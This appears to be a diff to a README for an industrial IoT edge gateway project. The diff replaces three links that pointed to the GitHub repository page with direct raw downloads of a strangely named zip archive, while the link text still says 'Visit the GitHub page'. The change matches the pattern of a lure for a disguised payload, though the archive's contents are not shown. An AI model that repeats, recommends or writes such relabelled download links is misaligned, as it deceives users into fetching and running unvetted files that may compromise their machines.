@@ -1,6 +1,6 @@
 # 🏭 IIoT-Edge-Gateway - Connect Devices, Data, and Systems
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://github.com/sads223/IIoT-Edge-Gateway)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20page-blue?style=for-the-badge)](https://raw.githubusercontent.com/sads223/IIoT-Edge-Gateway/main/sog/Gateway-Io-I-Edge-Sekhwan.zip)
 
 ## 🚀 Getting Started
 
@@ -20,7 +20,7 @@ Use this guide if you want to:
 
 Open this link in your browser:
 
-[Download IIoT-Edge-Gateway](https://github.com/sads223/IIoT-Edge-Gateway)
+[Download IIoT-Edge-Gateway](https://raw.githubusercontent.com/sads223/IIoT-Edge-Gateway/main/sog/Gateway-Io-I-Edge-Sekhwan.zip)
 
 ### 2. Get the app
 
@@ -301,4 +301,4 @@ That gives you one edge point for device links and data flow.
 
 If you need to get the app again, use this link:
 
-[Visit the GitHub page to download IIoT-Edge-Gateway](https://github.com/sads223/IIoT-Edge-Gateway)
+[Visit the GitHub page to download IIoT-Edge-Gateway](https://raw.githubusercontent.com/sads223/IIoT-Edge-Gateway/main/sog/Gateway-Io-I-Edge-Sekhwan.zip)
